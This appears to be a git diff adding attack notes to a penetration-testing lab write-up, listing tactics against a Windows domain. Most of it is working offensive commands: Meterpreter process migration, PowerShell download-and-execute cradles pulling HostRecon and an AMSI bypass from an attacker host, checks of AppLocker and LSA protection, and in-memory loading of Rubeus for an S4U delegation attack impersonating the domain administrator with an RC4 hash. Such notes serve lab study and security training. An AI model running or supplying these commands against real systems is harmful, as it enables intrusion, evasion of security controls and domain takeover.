@@ -99,6 +99,41 @@ run -j
 
 Domain Admins: Administrator and pete
 
-scaning#
 
+## TTPS
+scaning
 sudo nmap -A -Pn 192.168.120.130-132
+
+Process Migrate
+```
+meterpreter > execute -H -f notepad
+meterpreter > migrate 620
+```
+
+HostRecon
+```
+PS C:\windows\system32\inetsrv> (new-object system.net.webclient).downloadstring('http://192.168.119.120/HostRecon.ps1') | IEX
+```
+
+Check APP blocker rules
+```
+PS C:\windows\system32\inetsrv> Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
+```
+
+Check LSA protection
+```
+PS C:\windows\system32\inetsrv> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
+```
+
+Run AMSI patching
+```
+(new-object system.net.webclient).downloadstring('http://192.168.119.120/amsi.txt') | IEX
+```
+
+Powershell Load EXE:
+```
+PS C:\Windows\system32> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/Rubeus.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+PS C:\Windows\system32> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:12343649cc8ce713962859a2934b8cbb /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
+```
+
